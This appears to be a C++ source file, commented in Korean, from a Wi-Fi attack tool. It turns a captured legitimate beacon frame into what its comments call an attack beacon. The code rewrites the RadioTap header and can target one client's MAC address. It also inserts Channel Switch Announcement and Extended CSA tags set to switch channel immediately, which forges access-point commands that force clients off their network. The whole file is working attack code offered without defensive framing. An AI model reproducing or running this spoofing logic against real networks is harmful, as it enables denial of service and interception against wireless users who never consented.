// =============================================================================
// frame.cpp
// -----------------------------------------------------------------------------
// frame.h 에 선언된 build_csa_beacon 의 실제 동작을 구현한 파일.
// 캡처한 정상 비콘 -> CSA(5B) + ECSA(6B) 두 태그가 들어간 공격용 비콘 으로
// 변환하는 핵심 로직이 모여 있다. 도와주는 보조 함수도 같은 파일 안에 둔다.
// =============================================================================
#include "frame.h"
#include "dot11.h"
#include <cstring>     // memcpy, memmove

// -----------------------------------------------------------------------------
// radiotap_has_fcs : 캡처된 RadioTap 헤더를 살펴보고
//                    "패킷 맨 끝에 4바이트 FCS(체크섬) 가 붙어있는가?" 를 판단.
// -----------------------------------------------------------------------------
static bool radiotap_has_fcs(const uint8_t* rt, size_t rt_len) {
    if (rt_len < sizeof(dot11RadioTap)) return false;

    uint32_t firstPresent;
    std::memcpy(&firstPresent, rt + 4, 4);

    if (!(firstPresent & RT_PRESENT_FLAGS)) return false;

    // 확장 비트마스크가 이어지면(EXT 비트 = 1) 모두 건너뛴다.
    size_t   cursor = 8;
    uint32_t p      = firstPresent;
    while (p & RT_PRESENT_EXT) {
        if (cursor + 4 > rt_len) return false;
        uint32_t next;
        std::memcpy(&next, rt + cursor, 4);
        cursor += 4;
        p = next;
    }

    // TSFT(8B) 가 있다면 8바이트 정렬 후 8바이트 건너뛴다.
    if (firstPresent & RT_PRESENT_TSFT) {
        if (cursor % 8 != 0) cursor += (8 - cursor % 8);
        cursor += 8;
    }

    if (cursor >= rt_len) return false;

    return (rt[cursor] & RT_FLAG_FCS_AT_END) != 0;
}

// -----------------------------------------------------------------------------
// insert_or_replace_tag : Tagged Parameters 영역에 태그 하나를 끼워 넣거나
//                          이미 같은 번호의 태그가 있다면 교체한다.
//
//   outBuf       : 결과 버퍼 (호출자가 미리 할당)
//   outBufSize   : outBuf 의 총 크기. 끼워 넣다가 넘으면 0 반환
//   tagsStart    : Tagged Parameters 영역 시작 오프셋 (outBuf 기준)
//   tagsEnd      : 현재까지 사용된 끝 오프셋
//   tagNumber    : 끼워 넣을 태그 번호 (예: 37, 60)
//   tagBytes     : 끼워 넣을 태그의 실제 바이트열 ([번호][길이][데이터...])
//   tagBytesLen  : tagBytes 의 길이
//
//   반환값       : 갱신된 tagsEnd 오프셋. 버퍼 부족이면 0.
//
// 동작 :
//   1) Tagged Parameters 영역을 훑으며 같은 번호의 태그가 있는지 확인.
//      있으면 그 자리/길이를 기억해 둔다.
//   2) 없으면 802.11 권장대로 "번호 오름차순" 위치에 끼워 넣는다.
//      (자기보다 큰 번호 태그를 만나면 그 앞에 삽입)
//   3) 자리를 만들기 위해 뒤쪽 데이터를 memmove 로 밀거나 당긴다.
//   4) 비워둔 자리에 tagBytes 를 그대로 써넣는다.
// -----------------------------------------------------------------------------
static size_t insert_or_replace_tag(uint8_t* outBuf,
                                    size_t outBufSize,
                                    size_t tagsStart,
                                    size_t tagsEnd,
                                    uint8_t tagNumber,
                                    const uint8_t* tagBytes,
                                    size_t tagBytesLen)
{
    // (1) 영역 안을 훑어 위치 결정
    size_t existingLen = 0;        // 이미 같은 번호 태그가 있다면 그 전체 크기
    size_t pos         = 0;        // tagsStart 로부터의 오프셋
    size_t tagsLen     = tagsEnd - tagsStart;
    const uint8_t* tags = outBuf + tagsStart;

    while (pos + 2 <= tagsLen) {
        uint8_t tn = tags[pos];
        uint8_t tl = tags[pos + 1];
        size_t  total = 2 + tl;
        if (pos + total > tagsLen) break;     // 길이 필드가 영역 밖 -> 손상된 태그
        if (tn == tagNumber) { existingLen = total; break; }  // 같은 번호 발견 -> 교체
        if (tn > tagNumber)  break;            // 더 큰 번호 발견 -> 그 앞에 삽입
        pos += total;
    }
    size_t insertPos = tagsStart + pos;

    // (2) 자리 만들기
    if (existingLen > 0) {
        // 이미 있던 태그 -> 길이가 다르면 뒤쪽 데이터를 당기거나 밀어 자리 조정
        if (existingLen != tagBytesLen) {
            size_t newTagsEnd = tagsEnd - existingLen + tagBytesLen;
            if (newTagsEnd > outBufSize) return 0;
            std::memmove(outBuf + insertPos + tagBytesLen,
                         outBuf + insertPos + existingLen,
                         tagsEnd - (insertPos + existingLen));
            tagsEnd = newTagsEnd;
        }
    } else {
        // 새로 끼워 넣음 -> 뒷부분을 tagBytesLen 만큼 뒤로 민다
        if (tagsEnd + tagBytesLen > outBufSize) return 0;
        std::memmove(outBuf + insertPos + tagBytesLen,
                     outBuf + insertPos,
                     tagsEnd - insertPos);
        tagsEnd += tagBytesLen;
    }

    // (3) 새 태그 바이트를 비워둔 자리에 복사
    std::memcpy(outBuf + insertPos, tagBytes, tagBytesLen);
    return tagsEnd;
}

// -----------------------------------------------------------------------------
// build_csa_beacon : 외부에 공개되는 메인 함수. (선언은 frame.h)
//
// 흐름
//   1) 캡처 데이터 유효성 검사
//   2) 캡처 끝에 FCS 가 있다면 잘라낸다
//   3) outBuf 맨 앞에 새 RadioTap 헤더(8B, 옵션 없음) 작성
//   4) 캡처에서 802.11 본체만 outBuf 로 복사
//   5) (옵션) DA(addr1) 를 staMac 으로 교체 (unicast 모드)
//   6) Tagged Parameters 영역에 CSA(5B) 와 ECSA(6B) 두 태그를 삽입
//   7) 완성된 프레임 길이 반환
// -----------------------------------------------------------------------------
size_t build_csa_beacon(uint8_t* outBuf, size_t outBufSize,
                        const uint8_t* captured, size_t capturedLen,
                        bool useUnicast, const Mac& staMac)
{
    // (1) RadioTap 고정부(8B) 보다 짧으면 잘못된 데이터
    if (capturedLen < sizeof(dot11RadioTap)) return 0;

    uint16_t rtLenRaw;
    std::memcpy(&rtLenRaw, captured + 2, 2);
    size_t rtLen = rtLenRaw;
    if (rtLen < sizeof(dot11RadioTap) || rtLen > capturedLen) return 0;

    // (2) FCS 가 끝에 붙었으면 4B 잘라낸다
    size_t dot11End = capturedLen - (radiotap_has_fcs(captured, rtLen) ? 4 : 0);

    // 802.11 본체가 [MAC 헤더 24 + Beacon 고정 12] 이상은 있어야 비콘
    if (dot11End < rtLen + sizeof(dot11MacHdr) + BEACON_FIXED_PARAM_LEN) return 0;
    size_t dot11Len = dot11End - rtLen;

    // 본체를 옮길 공간만 일단 확인 (CSA/ECSA 추가 공간은 헬퍼가 검사)
    if (outBufSize < sizeof(dot11RadioTap) + dot11Len) return 0;

    // (3) outBuf 맨 앞에 최소형 RadioTap 헤더 작성
    dot11RadioTap* rtOut = reinterpret_cast<dot11RadioTap*>(outBuf);
    rtOut->it_version = 0;
    rtOut->it_pad     = 0;
    rtOut->it_len     = sizeof(dot11RadioTap);  // 8
    rtOut->it_present = 0;

    // (4) 캡처의 802.11 본체를 그대로 복사
    std::memcpy(outBuf + sizeof(dot11RadioTap), captured + rtLen, dot11Len);

    // (5) Unicast 옵션이면 DA(addr1) 만 staMac 으로 교체
    if (useUnicast) {
        std::memcpy(outBuf + sizeof(dot11RadioTap) + offsetof(dot11MacHdr, addr1),
                    staMac.mac_, 6);
    }

    // (6) Tagged Parameters 영역에 CSA, ECSA 두 태그 삽입
    size_t tagsStart = sizeof(dot11RadioTap) + sizeof(dot11MacHdr) + BEACON_FIXED_PARAM_LEN;
    size_t tagsEnd   = sizeof(dot11RadioTap) + dot11Len;

    // -- CSA (5B) 준비 --
    CsaTag csa;
    csa.tagNumber   = CSA_TAG_NUMBER;
    csa.tagLength   = CSA_TAG_LENGTH;
    csa.switchMode  = CHSW_SWITCH_MODE;
    csa.newChannel  = CHSW_NEW_CHANNEL;
    csa.switchCount = CHSW_SWITCH_COUNT;    // 0 = 즉시 전환

    tagsEnd = insert_or_replace_tag(outBuf, outBufSize, tagsStart, tagsEnd,
                                    CSA_TAG_NUMBER,
                                    reinterpret_cast<const uint8_t*>(&csa),
                                    sizeof(csa));
    if (tagsEnd == 0) return 0;

    // -- ECSA (6B) 준비 --
    EcsaTag ecsa;
    ecsa.tagNumber   = ECSA_TAG_NUMBER;
    ecsa.tagLength   = ECSA_TAG_LENGTH;
    ecsa.switchMode  = CHSW_SWITCH_MODE;
    ecsa.newOpClass  = ECSA_NEW_OP_CLASS;
    ecsa.newChannel  = CHSW_NEW_CHANNEL;
    ecsa.switchCount = CHSW_SWITCH_COUNT;   // 0 = 즉시 전환

    tagsEnd = insert_or_replace_tag(outBuf, outBufSize, tagsStart, tagsEnd,
                                    ECSA_TAG_NUMBER,
                                    reinterpret_cast<const uint8_t*>(&ecsa),
                                    sizeof(ecsa));
    if (tagsEnd == 0) return 0;

    // (7) 완성된 프레임의 총 길이
    return tagsEnd;
}

